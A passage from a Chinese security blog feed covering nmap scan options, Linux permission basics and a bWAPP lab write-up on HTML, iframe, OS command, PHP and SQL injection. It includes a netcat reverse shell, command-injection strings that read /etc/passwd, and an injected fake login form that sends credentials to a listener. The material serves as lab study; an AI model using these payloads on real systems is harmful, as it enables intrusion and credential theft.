SYN类型的扫描，如果返回RST类型的报文，则端口处于管理状态。这里我们值得注意的是关闭的端口也是可访问的，只是没有上层的服务在监听这个端口）</li><li>Filtered(过滤的)，由于报文无法到达指定的端口，nmap不能确定端口的开放状态，这主要是由于网络或者主机安装了一些防火墙所导致</li><li>Unfiltered(未被过滤的), 虽然可以访问到指定端口，但Nmap不能确定该端口是否处于开放状态。</li><li>Open|filtered  Nmap认为指定端口处于开放状态或过滤状态，这种状态只会出现在open端口对报文不做回应的扫描类型中，如：udp，ip protocol ，TCP null，fin，和xmas扫描类型</li><li>Closed|filtered Nmap认为指定端口处于开放状态或未过滤状态，</li></ol><p>以下是一些例子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 192.168.31.13 -p 8080</span><br><span class="line"><span class="meta">#</span><span class="bash">操作系统检测（-O）</span></span><br><span class="line"></span><br><span class="line">nmap  -Pn 80 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash"> 禁用主机检测（-Pn）,如果主机屏蔽了ping请求，Nmap可能会认为该主机没有开机。这将使得Nmap无法进行进一步检测，禁用Nmap的主机检测功能后。Nmap会认为目标主机已经开机并进行全套的检测工作</span></span><br><span class="line"></span><br><span class="line">nmap -A 192.168.31.13 -p 8080</span><br><span class="line"><span class="meta">#</span><span class="bash"> 强力检测选项（-A），Nmap将检测目标主机的下述信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务版本识别（-sV）；操作系统识别（-O）；脚本扫描（-sC）</span></span><br><span class="line"></span><br><span class="line">nmap -sT 192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行完整的三次 握手。如果成功建立连接，则判定该端口是开放端口。由于在检测每个端口时都需要进行三次握手，所以这种扫描方式比较慢，而且扫描行为很可能被目标主机记录下来</span></span><br><span class="line"></span><br><span class="line">nmap -sS 192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> SYN扫描（-sS）：该选项也称为半开连接或者SYN stealth。采用该选项后，Nmap将使用 含有SYN标志位的数据包进行端口探测。如果目标主机回复了SYN/ACK包，则说明该端口处 于开放状态：如果回复的是RST/ACK包，则说明这个端口处于关闭状态；如果没有任何响应 或者发送了ICMP unreachable信息，则可认为这个端口被屏蔽了。SYN模式的扫描速度非常 好。而且由于这种模式不会进行三次握手，所以是一种十分隐蔽的扫描方式</span></span><br><span class="line"></span><br><span class="line">namp -sN 192.168.31.1</span><br><span class="line">namp -sF 192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash">TCP NULL（-sN）、FIN（-sF）及XMAS（-sX）扫描：NULL 扫描不设置任何控制位； FIN扫描仅设置FIN标志位：XMAS扫描设置FIN、PSH和URG的标识位。如果目标主机返回 了含有RST标识位的响应数据，则说明该端口处于关闭状态；如果目标主机没有任何回应， 则该端口处于打开｜过滤状态。</span></span><br><span class="line"></span><br><span class="line">-O x.x.x.x #检测目标主机系统</span><br></pre></td></tr></table></figure><h3 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h3><p><code>nmap -sU 192.168.1.1</code> <br><br>Nmap有多种TCP扫描方式，而UDP扫描仅有一种扫描方式（-sU）。虽然UDP扫描结果没有 TCP扫描结果的可靠度高，但渗透测试人员不能因此而轻视UDP扫描，毕竟UDP端口代表着 可能会有价值的服务端程序。但是UDP扫描的最大问题是性能问题。由干Linux内核限制1秒内最多发送一次ICMP Port Unreachable信息。按照这个速度，对一台主机的65536个UDP端口进行完整扫描，总耗时必 定会超过18个小时。</p><p>优化方法主要是:</p><ol><li>进行并发的UDP扫描；</li><li>优先扫描常用端口；</li><li>在防火墙后面扫描；</li><li>启用–host-timeout选项以跳过响应过慢的主机。</li></ol><p>假如我们需要找到目标主机开放了哪些 UDP端口。为提高扫描速度，我们仅扫描 53端口 （DNS）和161端口（SNMP）</p><p>使用命令  <code>nmap -sU 192.168.56.103 -p 53,161</code></p><h3 id="目标端口选项"><a href="#目标端口选项" class="headerlink" title="目标端口选项"></a>目标端口选项</h3><p>默认情况下，Nmap将从每个协议的常用端口中随机选择1000个端口进行扫描。其nmapservices文件对端口的命中率进行了排名。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-p端口范围：只扫描指定的端口。扫描1〜1024号端口，可设定该选项为–p1-1024。扫描1 〜65535端口时，可使用-p-选项。</span><br><span class="line"></span><br><span class="line">-F（快速扫描）：将仅扫描100个常用端口。</span><br><span class="line"></span><br><span class="line">-r（顺序扫描）：指定这个选项后，程序将从按照从小到大的顺序扫描端口。</span><br><span class="line"></span><br><span class="line">-top-ports &lt;1 or=&quot;&quot;greater=&quot;&quot;&gt;：扫描nmap-services里排名前N的端口。</span><br></pre></td></tr></table></figure><p>Nmap还提供了脚本引擎功能（Nmap Scripting Engine，NSE）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65000 -sV 192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash">扫描目标ip的1-65000端口，并进行服务版本识别</span></span><br></pre></td></tr></table></figure><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><p>由于Nmap中提供了Ncat功能，Ncat包含NetCat的所有功能</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 80       #监听本机的TCP80端口</span><br><span class="line">nc -nvv 192.168.x.x 80    #连到192.168.x.x的TCP80端口</span><br><span class="line"></span><br><span class="line">nc -e /bin/bash 192.168.0.1 33</span><br><span class="line"><span class="meta">#</span><span class="bash"> 绑定到192.168.0.1的33端口，并反弹一个自己的shell到远程主机</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Nmap&quot;&gt;&lt;a href=&quot;#Nmap&quot; class=&quot;headerlink&quot; title=&quot;Nmap&quot;&gt;&lt;/a&gt;Nmap&lt;/h2&gt;&lt;p&gt;Nmap是被专业人员广泛使用的一款功能全面的端口扫描工具&lt;/p&gt;
&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; cla</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux 中的安全模型</title>
    <link href="http://yejuns.github.io/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/"/>
    <id>http://yejuns.github.io/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/</id>
    <published>2020-12-31T08:01:51.000Z</published>
    <updated>2021-07-05T05:48:45.271Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux-的构成"><a href="#Linux-的构成" class="headerlink" title="Linux 的构成"></a>Linux 的构成</h2><p>Linux 可以分为<code>内核层</code>和<code>用户层</code>。用户层通过内核层提供的操作接口，来执行各类任务</p><p>内核层提供的<code>权限划分、进程隔离和内存保护</code>的安全功能，是用户层的安全基础。一旦内核 安全被突破（比如黑客能够修改内核逻辑），黑客就可以任意地变更权限、操作进程和获取内存。</p><p>但作为使用者，对于内核层我们只需要按照插件漏洞的防护方法，确保使用官方的镜像并保持更新。我们需要关注的是用户层的安全。</p><h2 id="用户层安全"><a href="#用户层安全" class="headerlink" title="用户层安全"></a>用户层安全</h2><p>在 Linux 中，用户层的所有操作，都可以抽象为<code>“主体 -&gt; 请求 -&gt; 客体”</code>这么一个流程。 比如，“打开 /etc/passwd”这一操作的主体是实际的用户，请求是读，客体是 /etc/passwd 这个文件。</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/linux_1.jpg" alt="linux安全"></p><p>在这个过程中，Linux 内核安全提供了基于权限的访问控制，确保数据不被其他操作获取。<br>Linux 用户层则需要确保权限的正确配置</p><h3 id="Linux中的认证机制"><a href="#Linux中的认证机制" class="headerlink" title="Linux中的认证机制"></a>Linux中的认证机制</h3><p>Linux是一个多用户操作系统，它通过普通的文本文件来保存和管理用户信息。这其中，有 2个比较关键的文件：<code>/etc/passwd</code>和<code>/etc/shadow</code></p><p><code>/etc/passwd</code>是全局可读的，不具备保密性。因此，<code>/etc/passwd</code>不会直接存储密码，而是用x来进行占位。那实际的用户密码信息，就会存储到仅ROOT可读的<code>/etc/shadow</code>中。</p><p>在<code>/etc/shadow</code>中，除了加密后的密码，也保存了诸如密码有效天数、失效多少天告警之类的密码管理策略。我们可以通过Chage 命令来对密码管理策略进行修改,如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chage -M 60 ye</span><br><span class="line"><span class="meta">#</span><span class="bash"> 强制用户ye在 60 天内必须对密码进行修改</span></span><br></pre></td></tr></table></figure><p>因为认证这个功能是由Linux内核来提供的，所以在用户层，我们需要关心的,就是弱密码导致的身份信息泄漏。为了解决这个问题，在/etc/shadow中，我们可以制定适当的密码策略。除此之外，我们也可以通过使用已知的弱密码库，来对 Linux 中的弱密码进行检测</p><h3 id="Linux-中的授权机制"><a href="#Linux-中的授权机制" class="headerlink" title="Linux 中的授权机制"></a>Linux 中的授权机制</h3><p>Linux对目录和文件除了<code>r,w,x</code>3种权限外，还提供了一些额外的权限标签，来进行更细粒度地权限控制</p><p>Linux 提供了文件属性的概念，来对文件设置更多的保护。通过<code>chattr +i /etc/passwd</code>可以防止文件被任何用户修改</p><p>Linux 还提供了“粘滞位”的功能，主要用来防止用户随意操作其他用户的文件。比如<br><code>chmod +t /tmp</code>可以阻止删除/tmp目录下其他用户的文件</p><p><code>要解决权限问题，我们就要实践最小权限原则。</code></p><p>Linux中最普遍的问题，就是滥用<code>Root</code>，很多人在登录 Linux 系统后，第一个命令就是通过 su 来获取 ROOT 的 Shell 环境</p><p>但是，在 ROOT 的 Shell 环境中，启动的所有进程也都具备<code>ROOT</code>权限。如果启动的是一个立即返回的进程，如<code>CAT</code>,不会有太多问题，但如果是一个长期 运行的进程，就很容易产生权限的滥用。 比如，当你以<code>ROOT</code>的身份启动<code>Redis</code>或者 <code>MySQL</code> 时，如果这时有其他用户 连入 Redis 或者 MySQL，那他们也能间接地获取 ROOT 的权限。在大部分服务器入侵的场景中，黑客都是通过这些具备 ROOT 权限的进程漏洞，来实现权限提升的。</p><p>谨记“最小权限”原则。也就是说，我们根据要执行的操作等级，配置“最小权限”来启动常驻进程。比如，如果只是在 Redis 和 MySQL 这样的数据库中进行文件读写操作，根本不需要 ROOT 这种最高等级的权限。</p><p>我们不需要自己去配置这些权限，而是常常使用一些已知的工具，来实现“最小权限”启动长驻进程的功能。</p><p>比如说，我们可以通过 mysqld 启动 MySQL 服务时，mysqld 会将 MySQL 的进程分配到“mysql”这个用户，并在 ROOT下建立<code>守护进程</code>(可以理解为服务)。</p><p>类似的，当启动 Nginx 时，Nginx 会将 Worker 节点以 nobody 的用户身份来执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Linux-的构成&quot;&gt;&lt;a href=&quot;#Linux-的构成&quot; class=&quot;headerlink&quot; title=&quot;Linux 的构成&quot;&gt;&lt;/a&gt;Linux 的构成&lt;/h2&gt;&lt;p&gt;Linux 可以分为&lt;code&gt;内核层&lt;/code&gt;和&lt;code&gt;用户层&lt;/code</summary>
      
    
    
    
    
    <category term="Linux安全" scheme="http://yejuns.github.io/tags/Linux%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>burpsuite使用</title>
    <link href="http://yejuns.github.io/2020/12/31/burpsuite%E4%BD%BF%E7%94%A8/"/>
    <id>http://yejuns.github.io/2020/12/31/burpsuite%E4%BD%BF%E7%94%A8/</id>
    <published>2020-12-31T08:01:51.000Z</published>
    <updated>2021-07-05T00:21:11.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h2 id=&quot;-1&quot;&gt;&lt;a href=&quot;#-1&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;</summary>
      
    
    
    
    
    <category term="测试" scheme="http://yejuns.github.io/tags/%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>bwapp学习笔记-A1 Injection</title>
    <link href="http://yejuns.github.io/2020/12/31/bwapp-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AFA1/"/>
    <id>http://yejuns.github.io/2020/12/31/bwapp-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AFA1/</id>
    <published>2020-12-31T08:01:51.000Z</published>
    <updated>2021-07-02T08:37:23.091Z</updated>
    
    <content type="html"><![CDATA[<p>网络上相关的笔记也很多，但有些地方感觉还是得说得更清楚一些</p><h2 id="HTML-Injection-Reflection-Get"><a href="#HTML-Injection-Reflection-Get" class="headerlink" title="HTML Injection-Reflection(Get)"></a>HTML Injection-Reflection(Get)</h2><h3 id="low-level"><a href="#low-level" class="headerlink" title="low level"></a>low level</h3><p>对于输入的数据没有验证，直接显示在页面上，因此可以注入XSS</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 注入的代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alter(124)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span>click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="medium-level"><a href="#medium-level" class="headerlink" title="medium level"></a>medium level</h3><p>在源码中做了简单的字符替换（源码如下）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities</span></span><br><span class="line"><span class="variable">$input</span> = str_replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$input</span> = str_replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line"><span class="comment"># 对转换后的data还要进行url解码</span></span><br><span class="line"><span class="variable">$input</span> = urldecode(<span class="variable">$input</span>);</span><br></pre></td></tr></table></figure><p>因为对’&lt;’和’&gt;’都进行了html编码，所以在注入时可先对数据进行url编码，消除’&lt;’和’&gt;’，<code>因为后面会对输入的数据进行url解码</code>，所以可以注入成功。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 对 &lt; &gt; 经过url编码</span><br><span class="line">%3cscript%3ealter(124)%3c%2fscript%3e</span><br><span class="line">%3ca href = &quot;http://www.baidu.com&quot;%3eclick here %3c/a%3e</span><br></pre></td></tr></table></figure><h3 id="high-level"><a href="#high-level" class="headerlink" title="high level"></a>high level</h3><p>使用<code>htmlspecialchars</code>对数据进行编码，并且制定了字符编码方式为<code>utf-8</code>，避免了被<code>宽字节注入</code>，所以很难被绕过，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_3</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$encoding</span> = <span class="string">&quot;UTF-8&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// htmlspecialchars - converts special characters to HTML entities</span></span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars(<span class="variable">$data</span>, ENT_QUOTES, <span class="variable">$encoding</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，同样是对输入的数据进行html编码，<code>medium</code>为什么可以使用<code>url编码</code>被绕过，而<code>high</code>不能被绕过。一个重要的原因是<code>medium</code>中对输入的数据还进行了<code>url解码</code>，所以注入的数据可以正常解析，从而实现攻击。</p><h3 id="额外补充"><a href="#额外补充" class="headerlink" title="额外补充"></a>额外补充</h3><ol><li><p><code>htmlentities</code>：将所有的字符进行html编码；</p><p> <code>htmlspecialchars</code>：只对”&amp;,”,’,&lt;,&gt;”进行html编码</p></li><li><p>使用<code>htmlspecialchars</code>后，想要对其进行绕过，一种可行的方法是对注入的数据进行<code>uft-7</code>编码，然后将页面的编码方式也设为<code>uft-7</code>。</p></li></ol><h2 id="HTML-Injection-Reflection-POST"><a href="#HTML-Injection-Reflection-POST" class="headerlink" title="HTML Injection-Reflection(POST)"></a>HTML Injection-Reflection(POST)</h2><p>与get类似</p><h2 id="HTML-Injection-Reflected-URL"><a href="#HTML-Injection-Reflected-URL" class="headerlink" title="HTML Injection - Reflected (URL)"></a>HTML Injection - Reflected (URL)</h2><p>主要的处理函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&quot;0&quot;</span> :</span><br><span class="line">       <span class="comment">// $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . urldecode($_SERVER[&quot;REQUEST_URI&quot;]);</span></span><br><span class="line">       <span class="variable">$url</span> = <span class="string">&quot;http://&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_HOST&quot;</span>] . <span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>];</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;1&quot;</span> :</span><br><span class="line">       <span class="variable">$url</span> = <span class="string">&quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;2&quot;</span> :</span><br><span class="line">       <span class="variable">$url</span> = <span class="string">&quot;http://&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_HOST&quot;</span>] . xss_check_3(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h3 id="low-level-1"><a href="#low-level-1" class="headerlink" title="low level"></a>low level</h3><p>使用burpsuit对发起的请求进行抓包，重新构造请求，就可以进行注入。</p><h3 id="medium-level-1"><a href="#medium-level-1" class="headerlink" title="medium level"></a>medium level</h3><p>旧的IE浏览器不会对‘&lt;’ 和 ‘&gt;’进行编码，所以可以进行DOM XSS注入</p><h3 id="high-level-1"><a href="#high-level-1" class="headerlink" title="high level"></a>high level</h3><p>无法绕过(对输入进行了<code>htmlentities</code>)</p><h2 id="HTML-Injection-Stored-Blog"><a href="#HTML-Injection-Stored-Blog" class="headerlink" title="HTML Injection - Stored (Blog)"></a>HTML Injection - Stored (Blog)</h2><h3 id="low-level-2"><a href="#low-level-2" class="headerlink" title="low level"></a>low level</h3><p>因为有输入的文本框，先考虑是否存在存储型XSS<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/bwapp-1.png" alt="存储型XSS注入"></p><p>初次以外，我们还可以注入一个iframe进行钓鱼,比如在输入框中输入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">div class=&quot;test_code&quot;&gt;test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000; background-color:white;&quot;</span>&gt;</span></span><br><span class="line">Please Login Here To Proceed:</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:1234/hacked.html&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在127.0.0.1的主机上监听1234端口，比如我就使用nc监听了相关端口，<code>nc -lvnp 1234</code>,最后就可以得到用户的输入</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/bwapp-2.png" alt="钓鱼获取用户输入"></p><h3 id="medium-level-2"><a href="#medium-level-2" class="headerlink" title="medium level"></a>medium level</h3><p>无法绕过</p><h3 id="high-level-2"><a href="#high-level-2" class="headerlink" title="high level"></a>high level</h3><p>无法绕过</p><h2 id="iFrame-Injection"><a href="#iFrame-Injection" class="headerlink" title="iFrame Injection"></a>iFrame Injection</h2><h3 id="low-level-3"><a href="#low-level-3" class="headerlink" title="low level"></a>low level</h3><p>根据get请求可知，直接修改ParamUrl参数即可，</p><ul><li><p>原始URL：<code>http://127.0.0.1/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250</code></p></li><li><p>漏洞URL：<code>http://127.0.0.1/iframei.php?ParamUrl=http://www.baidu.com&amp;ParamWidth=250&amp;ParamHeight=250</code></p></li></ul><h3 id="medium-level-3"><a href="#medium-level-3" class="headerlink" title="medium level"></a>medium level</h3><p>对传入的URL使用<code>addslashes</code>函数进行处理，只会对<code>&#39; &quot; \ null</code>转义，因此依然可以绕过,只需要在ParamHeight后面闭合<iframw>即可，（或者使用 iframe 标签的 srcdoc 属性替换“src”属性的内容，达到更好的注入效果）</p><ul><li><p>漏洞URL：<code>ParamHeight=250&quot;&gt;&lt;/iframe&gt;&lt;h2&gt;hello&lt;/h2&gt;&lt;!--</code></p></li><li><p>漏洞URL：<code>http://127.0.0.1/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250&quot; srcdoc&gt;&lt;/iframe&gt;&lt;iframe src=https://www.baidu.com width=800 height=1000&gt;&quot; </code></p></li></ul><h3 id="high-level-3"><a href="#high-level-3" class="headerlink" title="high level"></a>high level</h3><p>无法绕过</p><h2 id="LDAP-Injection"><a href="#LDAP-Injection" class="headerlink" title="LDAP Injection"></a>LDAP Injection</h2><p>LDAP注入攻击和SQL注入攻击相似，因此接下来的想法是利用用户引入的参数生成LDAP查询。一个安全的Web应用在构造和将查询发送给服务器前应该净化用户传入的参数。在有漏洞的环境中，这些参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。 使用得最广泛的LDAP：ADAM和OpenLDAP。</p><h2 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>使用了shell_exec()方法，且没有过滤，可用命令</p><ol><li><a href="http://www.nsa.gov/">www.nsa.gov</a>; cat /etc/passwd</li><li><a href="http://www.nsa.gov/">www.nsa.gov</a> &amp; uname -a</li><li><a href="http://www.nsa.gov/">www.nsa.gov</a> | ps -ef</li><li>这种情况下，甚至可以获得一个反弹shell，<code>www.nsa.gov ; nc -vlp 1234 -e /bin/bash</code></li></ol><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>源码中对‘;’ ‘&amp;’进行了过滤，但仍然可以使用<code>|</code></p><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>源码中使用了<code>escapeshellcmd</code>函数，确保用户只执行一个命令</p><h2 id="OS-Command-Injection-Blind"><a href="#OS-Command-Injection-Blind" class="headerlink" title="OS Command Injection-Blind"></a>OS Command Injection-Blind</h2><p>盲注的思想在于根据请求的时间，来判断命令是否运行成功。</p><h2 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection"></a>PHP Code Injection</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p>根据首页可以推测，肯定是通过url进行php相关脚本的注入。</p><p>原始url：<code>http://192.168.50.151/phpi.php</code></p><p>恶意url：<code>http://192.168.50.151/phpi.php?message=phpinfo()</code></p><p>造成代码注入的原因是没有对输入进行过滤，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span> (<span class="string">&quot;echo &quot;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&quot;message&quot;</span>] . <span class="string">&quot;;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="medium-amp-high"><a href="#medium-amp-high" class="headerlink" title="medium &amp; high"></a>medium &amp; high</h3><p>无法绕过，对输入进行了转义，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars(<span class="variable">$_REQUEST</span>[<span class="string">&quot;message&quot;</span>], ENT_QUOTES, <span class="string">&quot;UTF-8&quot;</span>);;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SQL-Injection-GET-Search"><a href="#SQL-Injection-GET-Search" class="headerlink" title="SQL Injection (GET/Search)"></a>SQL Injection (GET/Search)</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><ol><li><p>对于sql注入，我们首先要找到注入点<br><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/bwapp-3.png" alt="确定sql注入点"></p></li><li><p>然后确定字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 8<span class="comment">#</span></span><br><span class="line">1&#x27; order by 7<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/bwapp-4.png" alt="确定sql注入点"><br><img 